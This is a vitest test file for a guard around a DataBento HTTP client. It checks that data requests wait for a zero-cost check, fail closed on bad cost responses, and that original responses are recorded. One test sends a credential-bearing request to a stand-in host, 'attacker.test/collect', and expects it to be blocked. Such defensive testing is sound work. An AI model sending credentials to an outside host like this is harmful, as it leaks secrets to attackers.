import { afterEach, describe, expect, it, vi } from "vitest";
import { DataBentoHTTP } from "../../../src/http/databento-http.js";
import { installPlatformTransportGuard } from "../../../src/api/platform-transport.js";

let guard: ReturnType<typeof installPlatformTransportGuard> | undefined;
afterEach(() => { guard?.restore(); guard = undefined; vi.restoreAllMocks(); });

describe("platform transport cost and originals boundary", () => {
  it("requires raw numeric zero before each actual historical request and keeps omitted end", async () => {
    const request = { dataset: "GLBX.MDP3", symbols: "ES.c.0", schema: "ohlcv-1d",
      start: "2026-01-01", stype_in: "continuous", stype_out: "instrument_id", limit: 2, encoding: "csv" };
    const upstream = vi.spyOn(globalThis, "fetch").mockImplementation(async url =>
      new Response(String(url).includes("metadata.get_cost") ? "0" : "ts_event,close\n1,5000000000000\n"));
    guard = installPlatformTransportGuard("db-synthetic-key");
    const http = new DataBentoHTTP("db-synthetic-key");
    await http.get("/v0/timeseries.get_range", request);
    const calls = upstream.mock.calls.map(call => new URL(String(call[0])));
    expect(calls.map(call => call.pathname)).toEqual(["/v0/metadata.get_cost", "/v0/timeseries.get_range"]);
    expect(Object.fromEntries(calls[0].searchParams)).toMatchObject({ dataset: request.dataset, symbols: request.symbols,
      schema: request.schema, start: request.start, stype_in: "continuous", limit: "2" });
    expect(calls[0].searchParams.has("end")).toBe(false);
    expect(Object.fromEntries(calls[1].searchParams)).toEqual({...request,limit:"2"});
    expect(guard.originals).toHaveLength(2);
    expect(Buffer.from(guard.originals[0].data_base64, "base64").toString()).toBe("0");
    expect(guard.originals[1].representation).toBe("decoded_http_body");
    expect(guard.originals[1].sha256).toMatch(/^[a-f0-9]{64}$/);
    expect(guard.originals[1].request.parameters).toEqual(request);
  });
  it.each(["1", "-1", '"0"', '{"total_cost":0}', "null", "false", "NaN", "[]"])(
    "fails closed on cost response %s", async cost => {
      const upstream = vi.spyOn(globalThis, "fetch").mockImplementation(async () => new Response(cost));
      guard = installPlatformTransportGuard("db-fixture");
      await expect(new DataBentoHTTP("db-fixture").get("/v0/timeseries.get_range", {
        dataset: "GLBX.MDP3", symbols: "ES.c.0", schema: "trades", start: "2026-10-22"
      })).rejects.toThrow();
      expect(upstream).toHaveBeenCalledTimes(1);
      expect(new URL(String(upstream.mock.calls[0][0])).pathname).toBe("/v0/metadata.get_cost");
    });
  it("denies unknown endpoints and never captures leaked credentials", async () => {
    const upstream = vi.spyOn(globalThis, "fetch").mockImplementation(async () => new Response("db-credential-fixture"));
    guard = installPlatformTransportGuard("db-credential-fixture");
    const http = new DataBentoHTTP("db-credential-fixture");
    await expect(http.get("https://attacker.test/collect", {})).rejects.toThrow();
    expect(upstream).not.toHaveBeenCalled();
    await expect(http.get("/v0/metadata.list_datasets", {})).rejects.toThrow();
    expect(guard.originals).toHaveLength(0);
  });
  it("cost failure does not reach data; successful metadata and symbology need no cost request", async () => {
    const upstream = vi.spyOn(globalThis, "fetch").mockImplementation(async url =>
      new Response(String(url).includes("symbology.resolve") ? '{"result":{}}' : "invalid cost response"));
    guard = installPlatformTransportGuard("db-fixture");
    const http = new DataBentoHTTP("db-fixture");
    await expect(http.get("/v0/timeseries.get_range", {dataset:"GLBX.MDP3", symbols:"ES.c.0",
      schema:"ohlcv-1d",start:"2026-01-01",end:"2026-01-02"})).rejects.toThrow();
    expect(upstream).toHaveBeenCalledTimes(1);
    await http.postForm("/v0/symbology.resolve", {dataset:"GLBX.MDP3",symbols:"ES.c.0"});
    expect(upstream).toHaveBeenCalledTimes(2);
    expect(guard.originals).toHaveLength(1);
  });
});
